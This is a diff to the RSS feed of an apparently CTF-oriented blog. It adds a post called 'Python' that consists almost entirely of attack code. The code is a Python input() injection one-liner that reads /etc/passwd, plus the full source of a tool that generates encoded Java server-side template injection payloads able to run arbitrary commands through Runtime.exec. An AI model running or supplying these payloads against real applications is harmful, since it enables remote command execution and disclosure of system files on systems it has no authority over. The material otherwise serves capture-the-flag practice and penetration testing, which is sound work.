@@ -6,8 +6,65 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 07 Jan 2023 09:33:57 +0530</lastBuildDate>
+        <lastBuildDate>Sat, 07 Jan 2023 18:04:11 +0530</lastBuildDate>
         <atom:link href="https://53ctf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Python</title>
+            <link>https://53ctf.github.io/posts/2023/01/python/</link>
+            <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
+            
+            <guid>https://53ctf.github.io/posts/2023/01/python/</guid>
+            <description>Take Advantage Of input() Function And Run System Commands Within It __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator GitHub
+#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
+            <content type="html"><![CDATA[<h4 id="take-advantage-of-input-function-and-run-system-commands-within-it">Take Advantage Of <code>input()</code> Function And Run System Commands Within It</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cat /etc/passwd&#39;</span>)
+</span></span></code></pre></div><h4 id="easy-ssti-payloads-generator">Easy SSTI Payloads Generator</h4>
+<p><a href="https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py">GitHub</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cmd <span style="color:#f92672">import</span> Cmd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse<span style="color:#f92672">,</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Generate SSTI payloads... One character at a time.&#34;</span>)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--url-encode&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;URL Encode&#34;</span>)
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url_encode<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>url_encode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Terminal</span>(Cmd):
+</span></span><span style="display:flex;"><span>	prompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;33mCommand ==&gt;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m &#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decimal_encode</span>(self,args):
+</span></span><span style="display:flex;"><span>		command<span style="color:#f92672">=</span>args
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		decimals<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> command:
+</span></span><span style="display:flex;"><span>			decimals<span style="color:#f92672">.</span>append(str(ord(i)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)&#39;&#39;&#39;</span> <span style="color:#f92672">%</span> decimals[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> decimals[<span style="color:#ae81ff">1</span>:]:
+</span></span><span style="display:flex;"><span>			line<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.concat(T(java.lang.Character).toString(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">))&#39;</span><span style="color:#f92672">.</span>format(i)
+</span></span><span style="display:flex;"><span>			payload<span style="color:#f92672">+=</span>line
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;).getInputStream())}&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> url_encode:
+</span></span><span style="display:flex;"><span>			payload_encoded<span style="color:#f92672">=</span>urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(payload,safe<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> payload_encoded
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">default</span>(self,args):
+</span></span><span style="display:flex;"><span>		print(self<span style="color:#f92672">.</span>decimal_encode(args))
+</span></span><span style="display:flex;"><span>		print()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	term<span style="color:#f92672">=</span>Terminal()
+</span></span><span style="display:flex;"><span>	term<span style="color:#f92672">.</span>cmdloop()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>	quit()
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>Linux Notes</title>
